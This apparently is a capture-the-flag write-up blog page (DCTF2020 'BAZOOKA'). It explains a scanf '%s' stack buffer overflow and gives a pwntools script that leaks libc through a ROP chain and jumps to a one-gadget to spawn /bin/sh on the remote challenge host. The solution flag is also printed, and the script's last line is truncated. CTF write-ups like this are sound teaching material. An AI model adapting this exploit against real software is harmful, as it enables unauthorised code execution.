@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        BAZOOKA ::
+        Xabifk
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content=" BAZOOKA # Proof of flag # ctf{9bb6df8e98240b46601db436ad276eaa635a846c9a5afa5b2075907adf39244b} # Summary of the vulnerabilities identified # Just a super simple buffer overflow(Don&rsquo;t need to tell me &ldquo;Try Harder&rdquo; mom).
+Proof of solving # The program in the first part prompts the user to input &quot;#!@{try_hard3r}&quot; to go on the vuln function, where the buffer overrun happens by using &ldquo;%s&rdquo; in the scanf format string and not &ldquo;%Xs&rdquo;, where X is a natural number. First I find the libc base address and use an ONE Gadget to land me on an execve(&quot;/bin/sh&quot;, 0, 0)
+"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/2020/12/bazooka/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="BAZOOKA">
+  <meta name="twitter:description" content="BAZOOKA # Proof of flag # ctf{9bb6df8e98240b46601db436ad276eaa635a846c9a5afa5b2075907adf39244b} # Summary of the vulnerabilities identified # Just a super simple buffer overflow(Don’t need to tell me “Try Harder” mom).
+Proof of solving # The program in the first part prompts the user to input &#34;#!@{try_hard3r}&#34; to go on the vuln function, where the buffer overrun happens by using “%s” in the scanf format string and not “%Xs”, where X is a natural number. First I find the libc base address and use an ONE Gadget to land me on an execve(&#34;/bin/sh&#34;, 0, 0)">
+
+
+
+<meta property="og:url" content="/posts/2020/12/bazooka/">
+  <meta property="og:site_name" content="Xabifk">
+  <meta property="og:title" content="BAZOOKA">
+  <meta property="og:description" content="BAZOOKA # Proof of flag # ctf{9bb6df8e98240b46601db436ad276eaa635a846c9a5afa5b2075907adf39244b} # Summary of the vulnerabilities identified # Just a super simple buffer overflow(Don’t need to tell me “Try Harder” mom).
+Proof of solving # The program in the first part prompts the user to input &#34;#!@{try_hard3r}&#34; to go on the vuln function, where the buffer overrun happens by using “%s” in the scanf format string and not “%Xs”, where X is a natural number. First I find the libc base address and use an ONE Gadget to land me on an execve(&#34;/bin/sh&#34;, 0, 0)">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-12-31T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-12-31T00:00:00+00:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="DCTF2020">
+    <meta property="article:tag" content="CTF">
+      <meta property="og:see_also" content="/posts/2020/12/alien-inclusion/">
+      <meta property="og:see_also" content="/posts/2020/12/basic-coms/">
+      <meta property="og:see_also" content="/posts/2020/12/bro64/">
+      <meta property="og:see_also" content="/posts/2020/12/darkmagic/">
+      <meta property="og:see_also" content="/posts/2020/12/dumb-discord/">
+      <meta property="og:see_also" content="/posts/2020/12/http-for-pros/">
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >xabifk</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Show more
+            <span class="menu__sub-inner-more-trigger-icon"
+              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span
+            >
+          </li>
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/series">Series</a></li>
+              
+            
+              
+                <li><a href="/tags">Tags</a></li>
+              
+            
+              
+                <li><a href="/archive">Timeline</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/posts">Posts</a></li>
+      
+    
+      
+        <li><a href="/series">Series</a></li>
+      
+    
+      
+        <li><a href="/tags">Tags</a></li>
+      
+    
+      
+        <li><a href="/archive">Timeline</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">BAZOOKA</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-12-31
+        </span>
+
+        
+          
+        
+      
+
+      
+        <span class="post-author"
+          >— Written by Xabifk</span
+        >
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="/tags/writeup/">#writeup</a>&nbsp;
+        
+          <a href="/tags/dctf2020/">#DCTF2020</a>&nbsp;
+        
+          <a href="/tags/ctf/">#CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <h2 id="bazooka">
+  <strong>BAZOOKA</strong>
+  <a href="#bazooka" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="proof-of-flag">
+  <strong>Proof of flag</strong>
+  <a href="#proof-of-flag" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h3 id="ctf9bb6df8e98240b46601db436ad276eaa635a846c9a5afa5b2075907adf39244b">
+  <strong>ctf{9bb6df8e98240b46601db436ad276eaa635a846c9a5afa5b2075907adf39244b}</strong>
+  <a href="#ctf9bb6df8e98240b46601db436ad276eaa635a846c9a5afa5b2075907adf39244b" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h3 id="summary-of-the-vulnerabilities-identified">
+  <strong>Summary of the vulnerabilities identified</strong>
+  <a href="#summary-of-the-vulnerabilities-identified" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Just a super simple buffer overflow(Don&rsquo;t need to tell me &ldquo;Try Harder&rdquo; mom).</p>
+<h3 id="proof-of-solving">
+  <strong>Proof of solving</strong>
+  <a href="#proof-of-solving" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The program in the first part prompts the user to input <em>&quot;#!@{try_hard3r}&quot;</em> to go on the vuln function, where the buffer overrun happens by using &ldquo;%s&rdquo; in the scanf format string and not &ldquo;%<strong>X</strong>s&rdquo;, where <strong>X</strong> is a natural number. First I find the libc base address and use an ONE Gadget to land me on an execve(&quot;/bin/sh&quot;, 0, 0)</p>
+<pre tabindex="0"><code>from pwn import *
+#context.terminal = &#39;st&#39;
+p = remote(&#34;34.89.211.188&#34;, 30027)
+elf = ELF(&#39;./pwn_bazooka_bazooka&#39;)
+pop_rdi = 0x004008f3 #: pop rdi
+print(hex(elf.plt[&#39;puts&#39;]))
+VULN = 0x4006f7
+exploit = b&#34;A&#34;*112 + b&#34;B&#34;*8 +p64(pop_rdi) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;]) +
+p64(VULN)
+log.info(&#34;First Stage: Sending the cool killer exploit string: %s&#34; % exploit)
+p.sendline(&#34;#!@{try_hard3r}&#34;) # HA ha I really laugh at it
+p.sendline(exploit)
+p.recvuntil(&#34;Message: Hacker alert!!!&#34;)
+p.recvline()
+u = p.recvline()
+u = u.split(b&#39;\n&#39;)[0]
+u = u64(u.ljust(8, b&#39;\x00&#39;))
+log.info(&#34;puts: &#34;+hex(u))
+libc_base = u - 0x80aa0
+log.info(&#34;Libc base at 0x%x&#34; % libc_base)
+ONE = 0x4f432 + libc_base # one shot gadget
+exploit = b&#34;A&#34;*112 + b&#34;B&#34;*8 +p64(ONE) + p64(ONE)
+log.info(&#34;Second Stage: Sending exploit...&#34;)
+p.sendline(exploit)
+p.interactive(
+</code></pre>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/posts/2020/12/basic-coms/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">BASIC COMS</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/posts/2020/12/bro64/">
+                  <span class="button__text">BRO64</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >xabifk</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span
+          >© 2025 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
+        >
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+  </body>
+</html>
